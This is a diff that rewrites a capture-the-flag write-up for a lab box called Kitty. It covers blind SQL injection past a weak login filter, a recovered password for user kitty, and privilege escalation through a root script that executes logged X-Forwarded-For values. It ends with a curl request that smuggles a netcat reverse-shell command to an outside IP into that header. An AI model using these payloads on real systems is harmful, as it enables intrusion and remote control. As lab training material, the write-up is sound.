@@ -57,15 +57,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 #### What we know
 
-The login page is running on a `Apache2` webserver. Which is running `PHP` which we can assume  there might be a sql injection. I tried a few payloads already some of them get caught which means that that there is some sort of detection system working in the backend which is not so good. When I tried testing for sql injection with `ghauri` at some point it got a redirect to a page called `/Welcome.php` which means it was able to bypass the login.
+Looking at what I had so far: the login page was being served by Apache2 running PHP, which immediately put SQL injection on my list of things to test first. I threw a handful of typical payloads at the login form and found that some of them were getting caught almost instantly, which told me there was some kind of detection or filtering logic sitting in front of the actual query, though clearly not a particularly robust one. When I ran `ghauri` against the login instead of testing payloads by hand, at some point it triggered a redirect to a page called `/Welcome.php`, which meant the tool had actually found a way to bypass authentication.
 
 ![Pasted image 20250522184403](Pasted-image-20250522184403.png)
 
-The correct login is `admin:admin` from there we are re-directed to the page `/welcome.php`. which displays a message saying that the website is still under development.
+Digging into what ghauri had actually found, the working credentials turned out to be nothing more exotic than `admin:admin`. Logging in with those took me to `/welcome.php`, which displayed a message explaining that the site was still under active development, a detail that would end up mattering a lot later on.
 
 ![Pasted image 20250522184710](Pasted-image-20250522184710.png)
 
-After attempting manual SQL injection I found that this sql injection requires a doubble `-` below is a program to dump databases.
+I went back and tested the injection manually rather than relying only on the automated tool, and confirmed the filter could be bypassed with a double-dash comment sequence instead of the usual single-dash form. With that bypass in hand, I wrote a small Python script to extract data blindly by measuring the response length for each guessed character:
 
 ```python
 import requests
@@ -107,6 +107,8 @@ while True:
 
 #### Dumping Tables
 
+Once I had the database name, the same blind technique let me enumerate the tables inside it:
+
 ```python
 import requests
 
@@ -147,6 +149,8 @@ while True:
 
 #### Dumping Tables
 
+From there I pointed the same approach at the `siteusers` table to pull out usernames one character at a time:
+
 ```python
 import requests
 
@@ -186,10 +190,12 @@ while True:
 
 ```
 
-User found was kitty.
+That extraction turned up a single username of interest: `kitty`.
 
 
 #### Dumping password.
+
+With a username in hand, I extended the script into a full four-stage extraction, database, then table, then username, then password, so I could recover the actual credential in one pass:
 
 ```python
 import requests
@@ -264,6 +270,7 @@ while state < 5:
 
 ```
 
+Running that end to end gave me a complete, working credential:
 
 ```bash
 database:	mywebsite
@@ -275,9 +282,11 @@ user:		kitty
 password:	L0ng_Liv3_KittY
 ```
 
-From there we can ssh into the user `kitty`.
+With a valid password in hand for `kitty`, SSH access to the box followed immediately.
 
 #### Interesting finds with `linpeas`
+
+Once I had a shell as `kitty`, I ran linPEAS to speed up local enumeration, and it flagged a few things worth following up on right away:
 
 ```bash
 ╔══════════╣ Web files?(output limit)
@@ -306,6 +315,8 @@ drwxr-xr-x 19 root root 4096 Nov  8  2022 ..
 
 
 ```
+
+The `DB_PASSWORD` I'd already recovered through the blind SQLi lined up with what linPEAS found in the config files, and the standalone script sitting in `/opt` looked promising for privilege escalation. Before touching either, though, I wanted to fully understand the login logic itself, so I pulled the source of `index.php`:
 
 #### Contents of `index.php`
 
@@ -408,7 +419,7 @@ if(!empty($login_err)){
 
 ### Privesc
 
-so the development site is running on port `8080`. the `index.php` logged all attempted SQL injections into `/var/www/development/logged` then the script `/opt` is ran by `root`
+Reading through that source clarified the whole privilege escalation path. The development site runs on port `8080`, and its home-grown WAF logic doesn't just block suspicious input, it also writes the raw `X-Forwarded-For` header straight into `/var/www/development/logged` whenever it flags an attempted injection. That file, in turn, gets processed by a script living in `/opt` that runs as root:
 
 ```bash
 #!/bin/sh
@@ -419,7 +430,7 @@ done < /var/www/development/logged
 cat /dev/null > /var/www/development/logged
 ```
 
-this script executes what is within `logged` poc I created to test on my loca l machine
+That `sh -c "echo $ip >> /root/logged"` line is the actual vulnerability: since `$ip` comes straight from user-controlled input with no sanitization, anything shell-metacharacter-shaped that I put into the `X-Forwarded-For` header gets interpreted and executed as root the next time that cron job runs. Before trying it against the real target, I put together a proof of concept and tested the same logic safely on my own local machine first:
 
 ```bash
 while read ip;
@@ -430,6 +441,8 @@ cat /dev/null > /home/anarchy/thm/boxes/kitty/logged
 ```
 
 ### root
+
+Confident the logic held up locally, I sent the same trick at the actual box: a crafted `X-Forwarded-For` header containing a reverse shell command, delivered through a request the WAF's own filtering wouldn't catch, since it only inspects the username and password fields, never the headers:
 
 ```bash
 curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "X-Forwarded-For: \$(busybox nc 10.21.23.235 9002 -e /bin/bash)" -d "username=sqlmyswl0x998&password=baphomet123" http://127.0.0.1:8080/index.php
